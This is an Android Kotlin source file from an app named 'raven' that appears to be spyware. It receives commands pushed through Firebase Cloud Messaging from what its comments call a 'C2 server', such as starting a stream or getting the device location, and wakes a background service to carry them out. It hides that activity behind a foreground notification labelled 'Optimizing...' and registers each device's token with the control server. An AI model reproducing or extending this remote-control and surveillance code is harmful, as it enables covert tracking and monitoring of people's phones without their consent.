package com.project.raven

import android.content.Intent
import androidx.core.content.ContextCompat
import com.google.firebase.messaging.FirebaseMessagingService
import com.google.firebase.messaging.RemoteMessage

class FCMListenerService : FirebaseMessagingService() {

    override fun onMessageReceived(remoteMessage: RemoteMessage) {
        // 1. Check if the payload contains data
        if (remoteMessage.data.isNotEmpty()) {
            val command = remoteMessage.data["command"]
            
            // 2. WAKE UP!
            // We received a signal. Now we must start the Foreground Service immediately
            // or the OS will kill us in 5 seconds.
            
            val serviceIntent = Intent(this, RavenService::class.java).apply {
                action = command // Pass the command (e.g., "START_STREAM", "GET_LOCATION")
                // Pass other params if needed
                remoteMessage.data.forEach { (key, value) ->
                    putExtra(key, value)
                }
            }

            // This forces the app to wake up and show the "Optimizing..." notification
            ContextCompat.startForegroundService(this, serviceIntent)
        }
    }

    override fun onNewToken(token: String) {
        // Send this token to your C2 server so you know who to message
        val serviceIntent = Intent(this, RavenService::class.java).apply {
            action = "REGISTER_FCM"
            putExtra("token", token)
        }
        ContextCompat.startForegroundService(this, serviceIntent)
    }
}
